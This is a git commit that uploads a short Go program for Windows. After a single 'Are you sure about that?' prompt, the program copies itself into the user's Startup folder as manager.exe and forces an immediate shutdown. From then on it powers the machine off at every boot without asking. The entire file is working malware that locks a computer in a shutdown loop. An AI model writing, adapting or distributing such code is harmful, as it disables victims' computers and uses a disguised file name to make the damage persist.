4db36711832e15370a890145a0070398751f817a
Blake <108043930+BlakeOnDex@users.noreply.github.com>
2023-11-09 23:58:08 -0500

    Add files via upload

---
+++ main.go
@@ -0,0 +1,43 @@
+package main
+
+import (
+	"os"
+	"os/exec"
+	"strings"
+
+	"github.com/Tobotobo/msgbox"
+)
+
+func main() {
+
+	// C:\Users\Kmuwl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+	current_exe_path := os.Args[0]
+	if strings.Contains(current_exe_path, `Programs\Startup`) {
+		StartShutdown()
+	} else {
+
+		dialog := msgbox.YesNo().Show("Are you sure about that?")
+		if dialog.Result.IsYes() {
+			SetRunAtStartup(current_exe_path)
+			StartShutdown()
+		} else {
+			os.Exit(0)
+		}
+
+	}
+
+}
+
+func SetRunAtStartup(current_exe_path string) {
+	exe_file_data, _ := os.ReadFile(current_exe_path)
+
+	roaming_path := os.Getenv("APPDATA")                                            // C:\Users\Kmuwl\AppData\Roaming
+	startup_path := roaming_path + `\Microsoft\Windows\Start Menu\Programs\Startup` // C:\Users\Kmuwl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+	startup_exe_path := startup_path + `\manager.exe`                               // C:\Users\Kmuwl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\manager.exe
+
+	os.WriteFile(startup_exe_path, exe_file_data, 0666)
+}
+
+func StartShutdown() {
+	exec.Command("shutdown", "/s", "/t", "0").Start()
+}
